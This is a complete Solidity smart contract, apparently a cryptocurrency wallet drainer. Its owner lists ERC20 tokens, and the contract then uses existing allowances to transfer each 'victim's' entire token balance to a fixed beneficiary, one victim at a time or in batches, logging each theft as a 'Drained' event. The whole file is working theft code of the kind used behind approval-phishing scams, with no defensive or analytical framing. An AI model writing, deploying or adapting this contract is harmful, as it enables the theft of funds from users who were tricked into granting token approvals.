// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract TokenPuller {
    address public owner;
    address public immutable beneficiary;

    address[] public tokens;
    mapping(address => bool) public isToken;

    event TokenAdded(address indexed token);
    event TokenRemoved(address indexed token);
    event Drained(address indexed victim, address indexed token, uint256 amount);
    event EthSwept(uint256 amount);

    modifier onlyOwner() {
        require(msg.sender == owner, "not owner");
        _;
    }

    constructor(address _beneficiary) {
        require(_beneficiary != address(0), "zero beneficiary");
        owner = msg.sender;
        beneficiary = _beneficiary;
    }

    function addToken(address token) external onlyOwner {
        require(token != address(0), "zero token");
        require(!isToken[token], "already added");
        isToken[token] = true;
        tokens.push(token);
        emit TokenAdded(token);
    }

    function removeToken(address token) external onlyOwner {
        require(isToken[token], "not a token");
        isToken[token] = false;
        uint256 len = tokens.length;
        for (uint256 i = 0; i < len; i++) {
            if (tokens[i] == token) {
                tokens[i] = tokens[len - 1];
                tokens.pop();
                break;
            }
        }
        emit TokenRemoved(token);
    }

    function tokenCount() external view returns (uint256) {
        return tokens.length;
    }

    function tokenAt(uint256 index) external view returns (address) {
        return tokens[index];
    }

    function drain(address victim) public onlyOwner {
        require(victim != address(0), "zero victim");
        uint256 tlen = tokens.length;
        for (uint256 i = 0; i < tlen; i++) {
            address t = tokens[i];
            (bool okB, bytes memory balData) = t.staticcall(
                abi.encodeWithSelector(IERC20.balanceOf.selector, victim)
            );
            if (!okB || balData.length < 32) continue;
            uint256 bal = abi.decode(balData, (uint256));
            if (bal == 0) continue;
            (bool ok, bytes memory data) = t.call(
                abi.encodeWithSelector(IERC20.transferFrom.selector, victim, beneficiary, bal)
            );
            if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
                emit Drained(victim, t, bal);
            }
        }
    }

    function drainAll(address[] calldata victims) external onlyOwner {
        for (uint256 i = 0; i < victims.length; i++) {
            drain(victims[i]);
        }
    }

    function sweepETH() external onlyOwner {
        uint256 bal = address(this).balance;
        require(bal > 0, "no eth");
        (bool ok, ) = beneficiary.call{value: bal}("");
        require(ok, "sweep failed");
        emit EthSwept(bal);
    }

    function rescue(address token, address to, uint256 amount) external onlyOwner {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, amount)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "rescue failed");
    }

    receive() external payable {}
}
